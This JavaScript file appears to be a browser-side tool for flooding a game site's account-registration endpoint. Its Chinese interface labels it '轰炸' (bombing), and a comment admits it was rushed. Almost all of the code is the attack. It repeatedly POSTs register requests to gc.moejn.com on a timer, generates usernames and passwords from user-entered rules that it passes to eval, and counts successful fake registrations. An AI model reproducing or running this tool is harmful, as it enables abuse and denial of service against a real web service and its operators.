//代码写的巨丑,问题巨多,赶工,不要介意

function sendAttack(param) {
  var time = new Date().getTime();
  var url = "http://gc.moejn.com/gameCenter/service/" + "?_=" + time;
  $.ajax({
    url: url,
    type: "POST",
    data: param,
    async: false,
    dataType: 'json',
    crossDomain: true,
    xhrFields: { withCredentials: true },
    success: function(data) {
      if (data.code == 1) {
        byid("last").innerText = "最后信息:请求成功!用户名:"+param.username+" 密码:"+param.password
        succ = succ + 1
      } else {
        switch (data.code) {
        case undefined:
          byid("last").innerText = "最后信息:服务器请求错误"
          break;
        case 100101:
          byid("last").innerText = "最后信息:用户名已经存在"
          break;
        case 102:
          byid("last").innerText = "最后信息:两次密码输入的不一致"
          break;
        case 204:
          byid("last").innerText = "最后信息:用户验证失败"
          break;
        case 205:
          byid("last").innerText = "最后信息:验证码错误"
          break;
        case 201:
          byid("last").innerText = "最后信息:用户名不正确"
          break;
        default:
          byid("last").innerText = "最后信息:未知错误:" + data.code
          break;
        }//Switch
      }//if else
    }//function(data)
  })//$.ajax
}//functon(param)

var chars = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'];

function rchar(n) {
  var res = "";
  for(var i = 0; i < n ; i ++) {
    var id = Math.ceil(Math.random()*35);
    res += chars[id];
    }
  return res;
}
byid=function(a){return document.getElementById(a)}
function attstop(){
clearInterval(Z)
byid("btno").innerText = "开始轰炸!"
byid("btno").onclick=attstart
}


function attstart(){
//byid("stat").innerText = "检查规则中..."
usrn=byid("usrn").value
pswd=byid("pswd").value
var getusrn = function(i){return eval(usrn)}
var getpswd = function(i){return eval(pswd)}
try 
{ 
getusrn(1)
getpswd(1)
} 
catch (e) 
{ 
alert("规则错误!"+e.name+":\n"+e.message+"\n描述:"+e.description); 
byid("stat").innerText = "尚未开始."
}
byid("stat").innerText = "正在开始轰炸..."
byid("btno").innerText = "停止轰炸!"
i=1
succ=0

Z=setInterval(function(){
sendAttack({act: "register",username: getusrn(i),password: getpswd(i)});
byid("stat").innerText = "注册次数:"+i+" 成功次数:"+succ
i=i+1
},Number(byid("time")))
byid("btno").onclick=attstop
}
